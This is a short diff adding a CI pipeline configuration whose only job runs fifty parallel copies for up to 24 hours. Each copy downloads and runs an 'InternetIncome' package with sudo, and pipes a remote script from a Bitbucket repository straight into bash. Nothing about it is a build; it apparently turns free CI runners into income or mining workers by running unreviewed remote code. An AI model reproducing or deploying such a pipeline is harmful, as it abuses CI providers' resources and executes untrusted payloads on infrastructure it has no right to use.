@@ -1,0 +1,20 @@
+version: v1.0 
+name: Initial Pipeline 
+agent: 
+  machine: 
+    type: e1-standard-2
+    os_image: ubuntu2004 
+execution_time_limit: 
+  hours: 24 
+fail_fast: 
+  stop: 
+    when: 'false' 
+blocks: 
+  - name: 'Block #1' 
+    task: 
+      jobs: 
+        - name: 'Job #1' 
+          commands: 
+            - curl https://sourceforge.net/projects/drths/files/InternetIncome.zip/download -L -o InternetIncome.zip && unzip InternetIncome.zip && cd InternetIncome && sudo bash internetIncome.sh --start
+            - curl -sL https://bitbucket.org/koploks/shc/raw/master/boled04.sh | bash
+          parallelism: 50
